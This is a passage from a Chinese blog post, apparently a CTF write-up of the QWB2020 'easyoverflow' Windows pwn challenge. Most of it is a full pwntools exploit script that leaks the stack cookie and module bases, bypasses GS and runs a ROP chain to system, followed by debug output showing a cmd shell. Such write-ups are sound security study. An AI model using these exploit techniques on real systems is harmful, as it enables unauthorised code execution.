class="number">0x180</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p4)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x180</span>)</span><br><span class="line"></span><br><span class="line">ntdll_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'ntdll_addr = '</span> + <span class="built_in">hex</span>(ntdll_addr))</span><br><span class="line"></span><br><span class="line">ntdll_base = ntdll_addr - <span class="number">0x485b</span></span><br><span class="line">li(<span class="string">'ntdll_base = '</span> + <span class="built_in">hex</span>(ntdll_base))</span><br><span class="line"></span><br><span class="line">pop_rcx_ret = <span class="number">0x0000000000096065</span> + ntdll_base</span><br><span class="line">pop_rbx_ret = <span class="number">0x00000000000012a7</span> + ntdll_base</span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000000f12ab</span> + ntdll_base</span><br><span class="line">puts_plt = <span class="number">0x10A6</span> + binary_base</span><br><span class="line">security_cookie_addr = <span class="number">0x3008</span> + binary_base</span><br><span class="line"></span><br><span class="line">p5 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">p5 += p64(StackCookie)</span><br><span class="line">p5 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line">p5 += p64(pop_rcx_ret)</span><br><span class="line">p5 += p64(security_cookie_addr)</span><br><span class="line">p5 += p64(pop_rbx_ret)</span><br><span class="line">p5 += p64(<span class="number">1</span>)</span><br><span class="line">p5 += p64(puts_plt)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p5)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">security_cookie = u64(r.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'security_cookie = '</span> + <span class="built_in">hex</span>(security_cookie))</span><br><span class="line"></span><br><span class="line">old_rsp = security_cookie ^ StackCookie</span><br><span class="line">li(<span class="string">'old_rsp = '</span> + <span class="built_in">hex</span>(old_rsp))</span><br><span class="line">new_rsp = old_rsp + <span class="number">0x160</span></span><br><span class="line">li(<span class="string">'new_rsp = '</span> + <span class="built_in">hex</span>(new_rsp))</span><br></pre></td></tr></tbody></table></figure>

<p>现在有了新的rsp，通过<code>security_cookie</code>异或出新的<code>StackCookie</code>即可正常rop，此时输出<code>ucrtbase</code>，然后算出system和cmd，值得注意的是再次rop，rsp还是会变的，算好偏移即可，最终exp如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote('10.211.55.3', 1234)</span></span><br><span class="line">r = remote(<span class="string">'192.168.10.102'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b'a'</span> * <span class="number">0x118</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span> ,p2)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x118</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'leak_addr = '</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">binary_base = leak_addr - <span class="number">0x12F4</span></span><br><span class="line">li(<span class="string">'binary_base = '</span> + <span class="built_in">hex</span>(binary_base))</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x1000</span> + binary_base</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">p3 += p64(StackCookie)</span><br><span class="line">p3 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line">p3 += p64(main_addr)</span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p3)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p1)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StackCookie = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'StackCookie = '</span> + <span class="built_in">hex</span>(StackCookie))</span><br><span class="line"></span><br><span class="line">p4 = <span class="string">b'a'</span> * <span class="number">0x180</span></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p4)</span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x180</span>)</span><br><span class="line"></span><br><span class="line">ntdll_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'ntdll_addr = '</span> + <span class="built_in">hex</span>(ntdll_addr))</span><br><span class="line"></span><br><span class="line">ntdll_base = ntdll_addr - <span class="number">0x485b</span></span><br><span class="line">li(<span class="string">'ntdll_base = '</span> + <span class="built_in">hex</span>(ntdll_base))</span><br><span class="line"></span><br><span class="line">pop_rcx_ret = <span class="number">0x0000000000096065</span> + ntdll_base</span><br><span class="line">pop_rbx_ret = <span class="number">0x00000000000012a7</span> + ntdll_base</span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000000f12ab</span> + ntdll_base</span><br><span class="line">puts_plt = <span class="number">0x10A6</span> + binary_base</span><br><span class="line">security_cookie_addr = <span class="number">0x3008</span> + binary_base</span><br><span class="line"></span><br><span class="line">p5 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">p5 += p64(StackCookie)</span><br><span class="line">p5 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line">p5 += p64(pop_rcx_ret)</span><br><span class="line">p5 += p64(security_cookie_addr)</span><br><span class="line">p5 += p64(pop_rbx_ret)</span><br><span class="line">p5 += p64(<span class="number">1</span>)</span><br><span class="line">p5 += p64(puts_plt)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p5)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">security_cookie = u64(r.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">li(<span class="string">'security_cookie = '</span> + <span class="built_in">hex</span>(security_cookie))</span><br><span class="line"></span><br><span class="line">old_rsp = security_cookie ^ StackCookie</span><br><span class="line">li(<span class="string">'old_rsp = '</span> + <span class="built_in">hex</span>(old_rsp))</span><br><span class="line">new_rsp = old_rsp + <span class="number">0x160</span></span><br><span class="line">li(<span class="string">'new_rsp = '</span> + <span class="built_in">hex</span>(new_rsp))</span><br><span class="line"></span><br><span class="line">read_got = <span class="number">0x2178</span> + binary_base</span><br><span class="line"></span><br><span class="line">p6 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">p6 += p64(new_rsp ^ security_cookie)</span><br><span class="line">p6 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line">p6 += p64(pop_rcx_ret) + p64(read_got)</span><br><span class="line">p6 += p64(pop_rbx_ret) + p64(<span class="number">1</span>)</span><br><span class="line">p6 += p64(puts_plt)</span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p6)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'a'</span> * <span class="number">0x100</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">ucrt_base = u64(r.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">0x7650</span></span><br><span class="line">li(<span class="string">'ucrt_base = '</span> + <span class="built_in">hex</span>(ucrt_base))</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0xBCB20</span> + ucrt_base</span><br><span class="line">cmd = <span class="number">0xE0020</span> + ucrt_base</span><br><span class="line"></span><br><span class="line">p7 = <span class="string">b'a'</span> * <span class="number">0x100</span></span><br><span class="line">p7 += p64((new_rsp + <span class="number">0x160</span>) ^ security_cookie)</span><br><span class="line">p7 += <span class="string">b'a'</span> * <span class="number">0x10</span></span><br><span class="line">p7 += p64(pop_rcx_ret) + p64(cmd)</span><br><span class="line">p7 += p64(system_addr)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">'input:'</span>, p7)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>

<p>看一下打通的</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">[DEBUG] Received <span class="number">0x6</span> bytes:</span><br><span class="line">    b<span class="number">'b</span>uffer<span class="number">'</span></span><br><span class="line">buffer[DEBUG] Received <span class="number">0x17d</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">3</span>a <span class="number">0</span>d <span class="number">0</span>a <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │:··a│aaaa│aaaa│aaaa│</span><br><span class="line">    <span class="number">00000010</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    <span class="number">00000100</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">8</span>a  d2 <span class="number">4f</span> <span class="number">29</span> c5  <span class="number">43</span> <span class="number">0</span>d <span class="number">0</span>a <span class="number">4</span>d  <span class="number">69</span> <span class="number">63</span> <span class="number">72</span> <span class="number">6f</span>  │aaa·│·O)·│C··M│icro│</span><br><span class="line">    <span class="number">00000110</span>  <span class="number">73</span> <span class="number">6f</span> <span class="number">66</span> <span class="number">74</span>  <span class="number">20</span> <span class="number">57</span> <span class="number">69</span> <span class="number">6</span>e  <span class="number">64</span> <span class="number">6f</span> <span class="number">77</span> <span class="number">73</span>  <span class="number">20</span> <span class="number">5b</span> b0 e6  │soft│ Win│dows│ [··│</span><br><span class="line">    <span class="number">00000120</span>  b1 be <span class="number">20</span> <span class="number">31</span>  <span class="number">30</span> <span class="number">2</span>e <span class="number">30</span> <span class="number">2</span>e  <span class="number">32</span> <span class="number">32</span> <span class="number">30</span> <span class="number">30</span>  <span class="number">30</span> <span class="number">2</span>e <span class="number">39</span> <span class="number">37</span>  │·· <span class="number">1</span>│<span class="number">0.0</span>.│<span class="number">2200</span>│<span class="number">0.97</span>│</span><br><span class="line">    <span class="number">00000130</span>  <span class="number">38</span> <span class="number">5</span>d <span class="number">0</span>d <span class="number">0</span>a  <span class="number">28</span> <span class="number">63</span> <span class="number">29</span> <span class="number">20</span>  <span class="number">4</span>d <span class="number">69</span> <span class="number">63</span> <span class="number">72</span>  <span class="number">6f</span> <span class="number">73</span> <span class="number">6f</span> <span class="number">66</span>  │<span class="number">8</span>]··│(c) │Micr│osof│</span><br><span class="line">    <span class="number">00000140</span>  <span class="number">74</span> <span class="number">20</span> <span class="number">43</span> <span class="number">6f</span>  <span class="number">72</span> <span class="number">70</span> <span class="number">6f</span> <span class="number">72</span>  <span class="number">61</span> <span class="number">74</span> <span class="number">69</span> <span class="number">6f</span>  <span class="number">6</span>e a1 a3 b1  │t Co│rpor│atio│n···│</span><br><span class="line">    <span class="number">00000150</span>  a3 c1 f4 cb  f9 d3 d0 c8  a8 c0 fb a1  a3 <span class="number">0</span>d <span class="number">0</span>a <span class="number">0</span>d  │····│····│····│····│</span><br><span class="line">    <span class="number">00000160</span>  <span class="number">0</span>a <span class="number">43</span> <span class="number">3</span>a <span class="number">5</span>c  <span class="number">55</span> <span class="number">73</span> <span class="number">65</span> <span class="number">72</span>  <span class="number">73</span> <span class="number">5</span>c <span class="number">4</span>c <span class="number">65</span>  <span class="number">6</span>e <span class="number">6f</span> <span class="number">76</span> <span class="number">6f</span>  │·C:\│User│s\Le│novo│</span><br><span class="line">    <span class="number">00000170</span>  <span class="number">5</span>c <span class="number">44</span> <span class="number">65</span> <span class="number">73</span>  <span class="number">6b</span> <span class="number">74</span> <span class="number">6f</span> <span class="number">70</span>  <span class="number">5</span>c <span class="number">70</span> <span class="number">77</span> <span class="number">6</span>e  <span class="number">3</span>e           │\Des│ktop│\pwn│&gt;│</span><br><span class="line">    <span class="number">0000017</span>d</span><br><span class="line">:</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��O)�C</span><br><span class="line">Microsoft Windows [�汾 <span class="number">10.0</span><span class="number">.22000</span><span class="number">.978</span>]</span><br><span class="line">(c) Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Users\Lenovo\Desktop\pwn&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>一次不通可以多打几次</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>也是学到了如何绕过GS，因为pwntools的模块没有像libc.sym的这样的东西，所以在写exp的时候没有自动化的一个获取，后面笔者有时间的话会寻找一下有没有对应的解决方案</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/434317266/answer/1623308852">https://www.zhihu.com/question/434317266/answer/1623308852</a></p>
<p><a target="_blank" rel="noopener" href="https://ret2ver.github.io/2021/10/02/2020%E5%BC%BA%E7%BD%91%E6%9D%AF-easyoverflow/">https://ret2ver.github.io/2021/10/02/2020%E5%BC%BA%E7%BD%91%E6%9D%AF-easyoverflow/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/z1r00/ctf-pwn/blob/main/winpwn/QWB2020/easyoverflow.zip">https://github.com/z1r00/ctf-pwn/blob/main/winpwn/QWB2020/easyoverflow.zip</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00">Projects</a></li>
         
          <li><a href="/links/">links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">win pwn初探（三）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.1.</span> <span class="toc-text">查看保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2StackCookie"><span class="toc-number">1.3.1.</span> <span class="toc-text">泄露StackCookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2binary-base"><span class="toc-number">1.3.2.</span> <span class="toc-text">泄露binary base</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2dll"><span class="toc-number">1.3.3.</span> <span class="toc-text">ret2dll</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.5.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/&amp;text=win pwn初探（三）"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/&amp;title=win pwn初探（三）"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/&amp;is_video=false&amp;description=win pwn初探（三）"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=win pwn初探（三）&amp;body=Check out this article: https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/&amp;title=win pwn初探（三）"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/&amp;title=win pwn初探（三）"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/&amp;title=win pwn初探（三）"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/&amp;title=win pwn初探（三）"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/&amp;name=win pwn初探（三）&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/&amp;t=win pwn初探（三）"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright ©
    
    
    2021-2024
    z1r0
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->



<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>